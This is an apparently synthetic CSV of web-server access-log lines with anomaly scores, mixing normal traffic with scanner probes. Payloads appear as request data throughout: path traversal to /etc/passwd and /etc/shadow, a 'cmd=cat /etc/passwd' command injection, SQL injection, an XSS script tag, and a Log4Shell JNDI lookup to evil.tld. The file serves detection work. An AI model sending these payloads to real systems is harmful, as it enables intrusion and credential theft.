score_content,score_session,score_fused,line
12.629631996154785,,12.629631996154785,{"remote_addr": "229.24.71.120", "time_local": "11/Jan/2025:09:04:23 -0700", "request": "GET /dashboard HTTP/2", "status": 403, "body_bytes_sent": 1334, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
82.90386962890625,,82.90386962890625,{"remote_addr": "163.202.103.254", "time_local": "11/Jan/2025:09:04:24 -0700", "request": "OPTIONS /contact HTTP/2", "status": 404, "body_bytes_sent": 1289, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
102.91670227050781,,102.91670227050781,{"remote_addr": "123.43.111.24", "time_local": "11/Jan/2025:09:04:25 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 584, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
16.956876754760742,,16.956876754760742,{"remote_addr": "101.226.220.254", "time_local": "11/Jan/2025:09:04:26 -0700", "request": "PUT /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 14234, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
11.188010215759277,,11.188010215759277,{"remote_addr": "224.242.252.119", "time_local": "11/Jan/2025:09:04:27 -0700", "request": "PUT /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 2048, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
12.963362693786621,,12.963362693786621,{"remote_addr": "24.222.6.132", "time_local": "11/Jan/2025:09:04:28 -0700", "request": "PUT / HTTP/2", "status": 200, "body_bytes_sent": 6483, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
16.829267501831055,,16.829267501831055,{"remote_addr": "179.145.122.56", "time_local": "11/Jan/2025:09:04:29 -0700", "request": "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 3151, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
73.9498062133789,,73.9498062133789,{"remote_addr": "207.109.244.208", "time_local": "11/Jan/2025:09:04:30 -0700", "request": "OPTIONS /login HTTP/2", "status": 302, "body_bytes_sent": 10565, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
104.95590209960938,,104.95590209960938,{"remote_addr": "69.236.187.40", "time_local": "11/Jan/2025:09:04:30 -0700", "request": "TRACE /login HTTP/2", "status": 302, "body_bytes_sent": 4762, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
0.25028735399246216,,0.25028735399246216,{"remote_addr": "69.68.144.34", "time_local": "11/Jan/2025:09:04:31 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 981, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
26.654773712158203,,26.654773712158203,{"remote_addr": "243.9.206.50", "time_local": "11/Jan/2025:09:04:32 -0700", "request": "DELETE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 2827, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
30.817827224731445,,30.817827224731445,{"remote_addr": "95.113.39.69", "time_local": "11/Jan/2025:09:04:33 -0700", "request": "DELETE /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 204, "body_bytes_sent": 7561, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.362761497497559,,4.362761497497559,{"remote_addr": "242.29.91.173", "time_local": "11/Jan/2025:09:04:33 -0700", "request": "POST /contact HTTP/2", "status": 200, "body_bytes_sent": 13093, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
0.281183660030365,,0.281183660030365,{"remote_addr": "225.205.52.137", "time_local": "11/Jan/2025:09:04:34 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 14662, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
26.58814811706543,,26.58814811706543,{"remote_addr": "67.58.213.36", "time_local": "11/Jan/2025:09:04:35 -0700", "request": "DELETE /server-status HTTP/2", "status": 200, "body_bytes_sent": 1076, "http_referer": "-", "http_user_agent": "dirb/2.22"}
30.895204544067383,,30.895204544067383,{"remote_addr": "244.236.200.71", "time_local": "11/Jan/2025:09:04:36 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 12114, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
11.225464820861816,,11.225464820861816,{"remote_addr": "94.120.94.164", "time_local": "11/Jan/2025:09:04:36 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 401, "body_bytes_sent": 549, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
0.26336783170700073,,0.26336783170700073,{"remote_addr": "194.50.90.35", "time_local": "11/Jan/2025:09:04:37 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 16019, "http_referer": "-", "http_user_agent": "dirb/2.22"}
7.851391315460205,,7.851391315460205,{"remote_addr": "132.226.120.130", "time_local": "11/Jan/2025:09:04:38 -0700", "request": "GET /search?q=headphones HTTP/2", "status": 304, "body_bytes_sent": 11586, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
30.98607635498047,,30.98607635498047,{"remote_addr": "199.183.38.243", "time_local": "11/Jan/2025:09:04:38 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 16228, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
76.06351470947266,,76.06351470947266,{"remote_addr": "160.1.241.254", "time_local": "11/Jan/2025:09:04:38 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 3388, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
33.129947662353516,,33.129947662353516,{"remote_addr": "204.201.126.79", "time_local": "11/Jan/2025:09:04:39 -0700", "request": "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 304, "body_bytes_sent": 6255, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
76.04438781738281,,76.04438781738281,{"remote_addr": "179.237.118.151", "time_local": "11/Jan/2025:09:04:40 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 7278, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
26.839208602905273,,26.839208602905273,{"remote_addr": "206.134.231.171", "time_local": "11/Jan/2025:09:04:41 -0700", "request": "DELETE /admin HTTP/2", "status": 200, "body_bytes_sent": 13694, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
30.953031539916992,,30.953031539916992,{"remote_addr": "96.203.244.245", "time_local": "11/Jan/2025:09:04:42 -0700", "request": "DELETE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 3216, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
75.97272491455078,,75.97272491455078,{"remote_addr": "68.58.137.54", "time_local": "11/Jan/2025:09:04:43 -0700", "request": "OPTIONS /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 16305, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
42.31827163696289,,42.31827163696289,{"remote_addr": "229.65.82.218", "time_local": "11/Jan/2025:09:04:44 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 403, "body_bytes_sent": 6, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
70.52290344238281,,70.52290344238281,{"remote_addr": "95.220.252.83", "time_local": "11/Jan/2025:09:04:45 -0700", "request": "OPTIONS /.git/config HTTP/2", "status": 200, "body_bytes_sent": 15698, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
16.790876388549805,,16.790876388549805,{"remote_addr": "192.245.116.19", "time_local": "11/Jan/2025:09:04:46 -0700", "request": "PUT /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 6563, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
28.768463134765625,,28.768463134765625,{"remote_addr": "11.113.72.154", "time_local": "11/Jan/2025:09:04:47 -0700", "request": "DELETE /api/products HTTP/2", "status": 304, "body_bytes_sent": 690, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
0.2793481945991516,,0.2793481945991516,{"remote_addr": "77.213.46.171", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 14030, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
0.2425214648246765,,0.2425214648246765,{"remote_addr": "236.5.112.82", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 1888, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
106.9607925415039,,106.9607925415039,{"remote_addr": "199.215.203.158", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "TRACE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 4602, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
109.0964126586914,,109.0964126586914,{"remote_addr": "141.104.147.104", "time_local": "11/Jan/2025:09:04:49 -0700", "request": "TRACE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 302, "body_bytes_sent": 362, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
14.872925758361816,,14.872925758361816,{"remote_addr": "230.232.109.178", "time_local": "11/Jan/2025:09:04:50 -0700", "request": "PUT /admin HTTP/2", "status": 302, "body_bytes_sent": 17754, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
8.584575653076172,,8.584575653076172,{"remote_addr": "141.193.176.35", "time_local": "11/Jan/2025:09:04:50 -0700", "request": "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 10578, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
4.333808898925781,,4.333808898925781,{"remote_addr": "195.95.15.43", "time_local": "11/Jan/2025:09:04:51 -0700", "request": "POST /contact HTTP/2", "status": 200, "body_bytes_sent": 4595, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
101.3176498413086,,101.3176498413086,{"remote_addr": "53.190.148.224", "time_local": "11/Jan/2025:09:04:52 -0700", "request": "TRACE /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 3617, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
76.00212860107422,,76.00212860107422,{"remote_addr": "134.147.153.210", "time_local": "11/Jan/2025:09:04:53 -0700", "request": "OPTIONS /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 1183, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
11.266676902770996,,11.266676902770996,{"remote_addr": "242.211.132.20", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "PUT /cgi-bin/test.cgi HTTP/2", "status": 204, "body_bytes_sent": 1310, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.8686599731445312,,2.8686599731445312,{"remote_addr": "254.170.38.17", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 248, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
4.617635726928711,,4.617635726928711,{"remote_addr": "169.115.70.28", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 15512, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
1.4701297283172607,,1.4701297283172607,{"remote_addr": "29.229.102.73", "time_local": "11/Jan/2025:09:04:55 -0700", "request": "GET /server-status HTTP/2", "status": 200, "body_bytes_sent": 729, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
15.4479398727417,,15.4479398727417,{"remote_addr": "68.208.43.228", "time_local": "11/Jan/2025:09:04:56 -0700", "request": "POST /logout HTTP/2", "status": 403, "body_bytes_sent": 616, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
27.561643600463867,,27.561643600463867,{"remote_addr": "98.51.102.213", "time_local": "11/Jan/2025:09:04:56 -0700", "request": "DELETE /index.html HTTP/2", "status": 304, "body_bytes_sent": 14646, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
50.553470611572266,,50.553470611572266,{"remote_addr": "194.142.1.7", "time_local": "11/Jan/2025:09:04:57 -0700", "request": "HEAD /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 15559, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
0.24976691603660583,,0.24976691603660583,{"remote_addr": "25.57.220.199", "time_local": "11/Jan/2025:09:04:58 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 5220, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
52.77052307128906,,52.77052307128906,{"remote_addr": "201.182.152.162", "time_local": "11/Jan/2025:09:04:59 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 304, "body_bytes_sent": 10869, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
11.282767295837402,,11.282767295837402,{"remote_addr": "200.72.128.164", "time_local": "11/Jan/2025:09:05:00 -0700", "request": "PUT /../../etc/passwd HTTP/2", "status": 200, "body_bytes_sent": 6160, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
16.898967742919922,,16.898967742919922,{"remote_addr": "187.99.162.110", "time_local": "11/Jan/2025:09:05:01 -0700", "request": "PUT /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 2668, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
18.94890594482422,,18.94890594482422,{"remote_addr": "108.254.218.45", "time_local": "11/Jan/2025:09:05:02 -0700", "request": "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 304, "body_bytes_sent": 14706, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
5.864625453948975,,5.864625453948975,{"remote_addr": "201.97.140.251", "time_local": "11/Jan/2025:09:05:02 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 8702, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
2.3356852531433105,,2.3356852531433105,{"remote_addr": "200.235.160.58", "time_local": "11/Jan/2025:09:05:03 -0700", "request": "GET /assets/app.css HTTP/2", "status": 304, "body_bytes_sent": 14038, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
76.02107238769531,,76.02107238769531,{"remote_addr": "62.4.133.150", "time_local": "11/Jan/2025:09:05:04 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 16281, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
102.7492904663086,,102.7492904663086,{"remote_addr": "244.39.118.82", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 4174, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
27.36890983581543,,27.36890983581543,{"remote_addr": "203.72.250.207", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "DELETE /../../etc/passwd HTTP/2", "status": 302, "body_bytes_sent": 3492, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.24140986800193787,,0.24140986800193787,{"remote_addr": "153.24.142.110", "time_local": "11/Jan/2025:09:05:06 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 8922, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.2836850881576538,,0.2836850881576538,{"remote_addr": "125.214.230.195", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 15544, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
46.371543884277344,,46.371543884277344,{"remote_addr": "246.10.198.240", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 1391, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
76.00517272949219,,76.00517272949219,{"remote_addr": "36.97.68.31", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 10904, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
87.03406524658203,,87.03406524658203,{"remote_addr": "228.183.10.247", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /api/product?id=123 HTTP/2", "status": 401, "body_bytes_sent": 1321, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
38.12385559082031,,38.12385559082031,{"remote_addr": "50.223.219.223", "time_local": "11/Jan/2025:09:05:09 -0700", "request": "DELETE / HTTP/2", "status": 404, "body_bytes_sent": 342, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
50.664794921875,,50.664794921875,{"remote_addr": "219.41.147.148", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 8850, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30.93865966796875,,30.93865966796875,{"remote_addr": "139.70.29.153", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "DELETE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5126, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
12.74312973022461,,12.74312973022461,{"remote_addr": "215.199.122.98", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "PUT /contact HTTP/2", "status": 200, "body_bytes_sent": 15064, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
6.502565383911133,,6.502565383911133,{"remote_addr": "95.112.233.92", "time_local": "11/Jan/2025:09:05:11 -0700", "request": "POST /login HTTP/2", "status": 304, "body_bytes_sent": 12334, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
4.383410453796387,,4.383410453796387,{"remote_addr": "95.167.130.150", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 9765, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
3.76802659034729,,3.76802659034729,{"remote_addr": "127.168.83.86", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /login HTTP/2", "status": 302, "body_bytes_sent": 13432, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
5.845534801483154,,5.845534801483154,{"remote_addr": "80.164.25.181", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 3103, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
48.504539489746094,,48.504539489746094,{"remote_addr": "171.74.41.136", "time_local": "11/Jan/2025:09:05:13 -0700", "request": "HEAD /dashboard HTTP/2", "status": 304, "body_bytes_sent": 16391, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
57.523887634277344,,57.523887634277344,{"remote_addr": "226.240.164.45", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "HEAD /logout HTTP/2", "status": 401, "body_bytes_sent": 449, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
16.898954391479492,,16.898954391479492,{"remote_addr": "96.175.201.226", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "GET /search?q=camera HTTP/2", "status": 403, "body_bytes_sent": 608, "http_referer": "-", "http_user_agent": "dirb/2.22"}
103.48391723632812,,103.48391723632812,{"remote_addr": "239.87.196.197", "time_local": "11/Jan/2025:09:05:15 -0700", "request": "TRACE /cgi-bin/test.cgi HTTP/2", "status": 302, "body_bytes_sent": 11455, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
30.938508987426758,,30.938508987426758,{"remote_addr": "224.46.51.15", "time_local": "11/Jan/2025:09:05:16 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 5083, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
12.710653305053711,,12.710653305053711,{"remote_addr": "28.179.90.47", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 1056, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
3.7055649757385254,,3.7055649757385254,{"remote_addr": "184.136.203.162", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "GET /profile HTTP/2", "status": 304, "body_bytes_sent": 7067, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
8.54444408416748,,8.54444408416748,{"remote_addr": "65.27.133.15", "time_local": "11/Jan/2025:09:05:18 -0700", "request": "POST /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 4572, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
12.723443031311035,,12.723443031311035,{"remote_addr": "15.79.229.49", "time_local": "11/Jan/2025:09:05:19 -0700", "request": "GET /contact HTTP/2", "status": 403, "body_bytes_sent": 363, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30.892017364501953,,30.892017364501953,{"remote_addr": "8.46.238.63", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 12687, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.2864692211151123,,2.2864692211151123,{"remote_addr": "239.63.227.208", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "GET /assets/app.js HTTP/2", "status": 301, "body_bytes_sent": 2340, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
70.45710754394531,,70.45710754394531,{"remote_addr": "161.135.94.227", "time_local": "11/Jan/2025:09:05:21 -0700", "request": "OPTIONS /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 2412, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
4.173709869384766,,4.173709869384766,{"remote_addr": "235.38.58.140", "time_local": "11/Jan/2025:09:05:22 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 4173, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
1.6471076011657715,,1.6471076011657715,{"remote_addr": "128.105.3.52", "time_local": "11/Jan/2025:09:05:23 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 12576, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
52.725643157958984,,52.725643157958984,{"remote_addr": "167.233.72.38", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 302, "body_bytes_sent": 1242, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
14.224161148071289,,14.224161148071289,{"remote_addr": "204.66.199.225", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "POST /index.html HTTP/2", "status": 403, "body_bytes_sent": 81, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
107.071044921875,,107.071044921875,{"remote_addr": "11.25.158.168", "time_local": "11/Jan/2025:09:05:25 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 14430, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
72.56594848632812,,72.56594848632812,{"remote_addr": "148.246.69.79", "time_local": "11/Jan/2025:09:05:26 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 302, "body_bytes_sent": 4055, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
2.2976186275482178,,2.2976186275482178,{"remote_addr": "93.75.143.136", "time_local": "11/Jan/2025:09:05:27 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 2101, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
75.99657440185547,,75.99657440185547,{"remote_addr": "224.169.93.210", "time_local": "11/Jan/2025:09:05:28 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8339, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
5.961914539337158,,5.961914539337158,{"remote_addr": "128.128.242.42", "time_local": "11/Jan/2025:09:05:29 -0700", "request": "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 17135, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
0.2900163233280182,,0.2900163233280182,{"remote_addr": "213.180.115.55", "time_local": "11/Jan/2025:09:05:30 -0700", "request": "GET /.git/config HTTP/2", "status": 200, "body_bytes_sent": 2841, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
